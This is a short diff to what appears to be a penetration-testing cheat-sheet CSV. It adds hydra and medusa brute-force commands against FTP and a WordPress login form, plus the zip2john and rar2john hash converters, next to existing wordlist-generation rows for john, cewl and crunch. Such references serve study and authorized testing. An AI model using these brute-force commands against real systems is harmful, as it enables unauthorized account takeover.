@@ -2,3 +2,10 @@ wordlist,permutation,john --wordlist=fileOfWords --rules > permutated
 wordlist,permutation,rules located at /etc/.john/john.conf
 wordlist,generate,cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
 wordlist,generate,crunch 11 11 -t buddy%%%%^^ -o wordlist2 
+bruteforce,ftp,hydra -l <user> -t <threads> -P /usr/share/seclists/Passwords/<file> ftp://<ip>
+bruteforce,ftp,medusa -h <ip> -u <user> -M ftp -P /usr/share/seclists/Passwords/<file> -t <threads>
+bruteforce,http,hydra <ip> http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Error" -l <user> -P /usr/share/seclists/Passwords/<file>
+hash,convert,zip2john
+hash,convert,rar2john
+
+
